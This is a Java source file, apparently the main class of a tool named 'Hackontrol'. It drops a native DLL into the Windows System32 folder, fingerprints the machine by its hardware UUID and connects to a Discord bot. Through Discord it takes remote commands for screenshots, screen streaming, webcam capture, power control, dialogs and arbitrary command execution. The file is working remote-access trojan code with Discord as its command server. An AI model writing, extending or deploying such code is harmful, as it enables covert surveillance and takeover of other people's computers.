package com.khopan.hackontrol;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Random;

import com.khopan.hackontrol.command.CameraCommand;
import com.khopan.hackontrol.command.Command;
import com.khopan.hackontrol.command.CommandCommand;
import com.khopan.hackontrol.command.DeviceListCommand;
import com.khopan.hackontrol.command.DialogCommand;
import com.khopan.hackontrol.command.HelpCommand;
import com.khopan.hackontrol.command.NicknameCommand;
import com.khopan.hackontrol.command.PowerCommand;
import com.khopan.hackontrol.command.ScreenshotCommand;
import com.khopan.hackontrol.command.SelectCommand;
import com.khopan.hackontrol.command.StreamCommand;
import com.khopan.hackontrol.command.WakeCommand;
import com.khopan.hackontrol.source.CommandSource;
import com.khopan.hackontrol.source.DefaultCommandSource;
import com.khopan.win32.Win32Library;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.exceptions.CommandSyntaxException;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	private static final String LIBRARY_NAME = "win32b.dll";

	private final String machineIdentifier;
	private final long userIdentifier;
	private final CommandDispatcher<CommandSource> dispatcher;

	private boolean selected;
	private String nickname;

	private Hackontrol(JDA bot, String machineIdentifier) {
		this.machineIdentifier = machineIdentifier;
		bot.addEventListener(new Listener());
		this.userIdentifier = bot.getSelfUser().getIdLong();
		this.dispatcher = new CommandDispatcher<>();
		this.registerCommand(new HelpCommand());
		this.registerCommand(new DeviceListCommand());
		this.registerCommand(new SelectCommand());
		this.registerCommand(new ScreenshotCommand());
		this.registerCommand(new StreamCommand());
		this.registerCommand(new PowerCommand());
		this.registerCommand(new CameraCommand());
		this.registerCommand(new NicknameCommand());
		this.registerCommand(new WakeCommand());
		this.registerCommand(new CommandCommand());
		this.registerCommand(new DialogCommand());
	}

	private void registerCommand(Command command) {
		command.register(this.dispatcher);
	}

	private void processMessage(MessageReceivedEvent Event) {
		if(Event.getAuthor().getIdLong() == this.userIdentifier) {
			return;
		}

		MessageChannelUnion channel = Event.getChannel();
		Message message = Event.getMessage();
		String content = message.getContentDisplay();

		if(content == null || content.isBlank()) {
			return;
		}

		if(content.indexOf('\n') == -1) {
			this.processSingleMessage(content, channel);
			return;
		}

		String[] parts = content.split("\n");

		if(parts == null || parts.length == 0) {
			return;
		}

		for(int i = 0; i < parts.length; i++) {
			String part = parts[i];

			if(part == null || part.isBlank()) {
				continue;
			}

			this.processSingleMessage(part, channel);
		}
	}

	private void processSingleMessage(String message, MessageChannel channel) {
		message = message.trim();

		if(!message.startsWith("$")) {
			return;
		}

		message = message.substring(1);

		if(message.isBlank()) {
			return;
		}

		CommandSource source = new DefaultCommandSource(this.machineIdentifier, channel, () -> this.selected, selected -> this.selected = selected, () -> this.nickname, nickname -> this.nickname = nickname);

		try {
			this.dispatcher.execute(message, source);
		} catch(CommandSyntaxException Exception) {
			if(!this.selected) {
				return;
			}

			source.sendCodeMessage(Exception.getMessage());
		}
	}

	public static void main(String[] args) throws Throwable {
		String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			System.exit(1);
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			System.exit(1);
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			System.exit(1);
			return;
		}

		File win32Library = new File(system32Directory, "win32c.dll");
		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
		InputStream stream = Hackontrol.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
		byte[] data = stream.readAllBytes();
		stream.close();
		FileOutputStream output = new FileOutputStream(libraryFile);
		output.write(data);
		output.close();
		System.load(libraryFile.getAbsolutePath());
		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
				.build();

		try {
			bot.awaitReady();
		} catch(Throwable ignored) {
			return;
		}

		String machineIdentifier = Hackontrol.getMachineId();
		new Hackontrol(bot, machineIdentifier);
	}

	private static String getMachineId() {
		ProcessBuilder processBuilder = new ProcessBuilder("wmic", "csproduct", "get", "uuid");
		processBuilder.redirectErrorStream(true);
		Process process;

		try {
			process = processBuilder.start();
		} catch(Throwable ignored) {
			return Hackontrol.getRandomMachineId();
		}

		InputStream stream = process.getInputStream();
		BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
		StringBuilder stringBuilder = new StringBuilder();
		String line;

		try {
			while((line = reader.readLine()) != null) {
				stringBuilder.append(line);
			}
		} catch(Throwable ignore) {
			return Hackontrol.getRandomMachineId();
		}

		String result = stringBuilder.toString();
		int length = result.length();

		if(length < 5) {
			return Hackontrol.getRandomMachineId();
		}

		StringBuilder idBuilder = new StringBuilder();

		for(int i = 4; i < length; i++) {
			char character = result.charAt(i);

			if(!Hackontrol.isHex(character)) {
				continue;
			}

			idBuilder.append(character);
		}

		MessageDigest digest;

		try {
			digest = MessageDigest.getInstance("SHA-1");
		} catch(Throwable ignored) {
			return Hackontrol.getRandomMachineId();
		}

		String identifierText = idBuilder.toString();
		byte[] identifierBytes = identifierText.getBytes(StandardCharsets.UTF_8);
		byte[] hashedBytes = digest.digest(identifierBytes);
		StringBuilder hashBuilder = new StringBuilder();

		for(int i = 0; i < hashedBytes.length; i++) {
			hashBuilder.append(String.format("%02x", hashedBytes[i]).toLowerCase());
		}

		return hashBuilder.toString();
	}

	private static String getRandomMachineId() {
		Random random = new Random(System.nanoTime() - System.currentTimeMillis());
		char[] hexMap = new char[] {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
		StringBuilder builder = new StringBuilder();

		for(int i = 0; i < 40; i++) {
			double value = random.nextDouble();
			int index = Math.min(Math.max((int) Math.round(value * 15.0d), 0), 15);
			builder.append(hexMap[index]);
		}

		return builder.toString();
	}

	private static boolean isHex(char character) {
		switch(character) {
		case '0':
		case '1':
		case '2':
		case '3':
		case '4':
		case '5':
		case '6':
		case '7':
		case '8':
		case '9':
		case 'a':
		case 'b':
		case 'c':
		case 'd':
		case 'e':
		case 'f':
		case 'A':
		case 'B':
		case 'C':
		case 'D':
		case 'E':
		case 'F':
			return true;
		}

		return false;
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onMessageReceived(MessageReceivedEvent Event) {
			new Thread(() -> Hackontrol.this.processMessage(Event)).start();
		}
	}
}
